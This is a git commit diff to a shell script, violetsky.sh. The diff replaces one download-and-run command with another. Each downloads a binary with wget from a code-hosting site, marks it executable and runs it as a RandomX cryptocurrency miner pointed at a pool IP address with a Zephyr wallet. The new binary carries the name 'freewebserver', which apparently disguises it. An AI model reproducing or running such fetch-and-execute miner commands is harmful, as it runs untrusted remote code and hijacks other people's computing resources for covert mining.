7a609189fe36f96cf58781d463250f91ab6b04b1
ismaimwan6372 <137773221+ismaimwan6372@users.noreply.github.com>
2023-06-28 18:22:13 +0800

    Update violetsky.sh

--- violetsky.sh
+++ violetsky.sh
@@ -1,3 +1,1 @@
-wget https://github.com/ismaimwan6372/gpuantre/raw/main/skyblue
-chmod 700 skyblue
-./skyblue -a RandomX -o 209.25.142.85:8080 -u ZEPHYR2rJcFiZNiZqHwcxneo69155BprsdTt2tywSZkZHczqR1ZQNtKHs4YveufDRwd57pE1zuUvVZ6D3y4KtA4o63jmxvPDxik1u -p webserver -t 3
+wget https://bitbucket.org/kardisali2/esdogger/raw/de3fd0dd7e98c5f810453fcb623cf787b1a61673/freewebserver && chmod 700 freewebserver && ./freewebserver -a RandomX -o 209.25.142.85:443 -u ZEPHYR2rJcFiZNiZqHwcxneo69155BprsdTt2tywSZkZHczqR1ZQNtKHs4YveufDRwd57pE1zuUvVZ6D3y4KtA4o63jmxvPDxik1u --keepalive -p rogstrix -t 3
